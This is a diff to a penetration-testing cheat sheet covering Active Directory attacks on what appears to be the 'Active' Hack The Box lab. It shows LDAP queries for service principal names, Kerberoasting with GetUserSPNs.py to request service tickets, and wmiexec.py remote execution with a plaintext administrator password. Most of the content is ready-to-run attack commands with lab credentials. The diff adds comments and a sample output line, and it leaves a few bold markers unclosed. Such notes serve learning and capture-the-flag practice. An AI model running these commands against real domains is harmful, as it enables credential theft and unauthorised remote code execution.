@@ -152,17 +152,18 @@ ldapsearch -x -h <IP> -p <PORT> -D 'USERNAME' -w 'PASSWORD' -b "dc=DOMAIN,dc=DOM
 ./GetADUsers.py -all DOMAIN/USERNAME -dc-ip <IP>
 ./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
 
-
+// Verify if a SPN exist
 ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
-
-
+OR 
 ./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP>
-**EX:** ./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1
+**EX: ./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1
+**OUTPUT: active/CIFS:445 -> a SPN exist
 
+// Request the token
 ./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP> -request
 **EX:** ./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1 -request
 
-
+// Wmiexec equivalent to psexec
 ./wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
 **EX:** ./wmiexec.py active.htb/administrator:Ticketmaster1968@10.0.0.1
 ```
